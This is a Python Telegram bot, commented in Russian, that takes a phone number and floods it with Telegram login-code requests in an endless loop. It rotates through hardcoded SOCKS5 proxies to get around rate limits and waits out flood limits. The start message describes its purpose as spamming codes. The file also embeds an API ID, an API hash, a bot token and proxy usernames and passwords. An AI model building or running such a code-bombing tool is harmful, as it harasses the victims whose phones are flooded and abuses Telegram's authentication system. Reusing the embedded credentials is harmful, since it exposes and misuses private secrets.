import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.network.connection import ConnectionTcpAbridged
import socks

API_ID = 35911533
API_HASH = "11dafcdc1514796c867055023716d39a"
BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

proxies = [
    {'ip': '185.192.110.221', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'},
    {'ip': '185.191.142.220', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'},
    {'ip': '185.184.78.155', 'port': 8000, 'user': 'hTJ2Cc', 'password': 'fNxamo'},
    None
]

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер телефона в формате +7XXXXXXXXXX или +380XXXXXXXXX для спама кодами.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task, client = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await client.disconnect()
        await update.message.reply_text("Спам остановлен.")
    else:
        await update.message.reply_text("Нет активного спама.")

async def send_code(proxy, phone):
    try:
        if proxy is None:
            async with TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged, timeout=20) as client:
                await client.connect()
                await client.send_code_request(phone)
                return True, None, "локальный"
        else:
            proxy_tuple = (socks.SOCKS5, proxy['ip'], proxy['port'], proxy['user'], proxy['password'])
            async with TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged, timeout=20) as client:
                await client.connect()
                await client.send_code_request(phone)
                return True, None, f"{proxy['ip']}:{proxy['port']}"
    except FloodWaitError as e:
        return True, e.seconds, "локальный" if proxy is None else f"{proxy['ip']}:{proxy['port']}"
    except Exception as e:
        return False, str(e)[:60], "локальный" if proxy is None else f"{proxy['ip']}:{proxy['port']}"

async def spam_worker(phone, chat_id, context):
    count = 0
    fail_count = 0
    idx = 0
    while True:
        proxy = proxies[idx % len(proxies)]
        idx += 1
        success, msg, label = await send_code(proxy, phone)
        if success:
            if isinstance(msg, int):
                await context.bot.send_message(chat_id, f"FloodWait {msg} сек на {label}")
                await asyncio.sleep(msg)
            else:
                count += 1
                await context.bot.send_message(chat_id, f"Код #{count} отправлен через {label}")
                fail_count = 0
        else:
            fail_count += 1
            if fail_count % 3 == 0:
                await context.bot.send_message(chat_id, f"Ошибка {fail_count} раз подряд: {msg} на {label}")
        await asyncio.sleep(0.5)

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идет спам для этого чата.")
        return

    client = TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged)
    await client.connect()

    task = asyncio.create_task(spam_worker(phone, chat_id, context))
    spam_tasks[chat_id] = (task, client)
    await update.message.reply_text("Спам запущен (3 прокси + локальный). Для остановки /stop")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    app.run_polling()

if __name__ == "__main__":
    main()
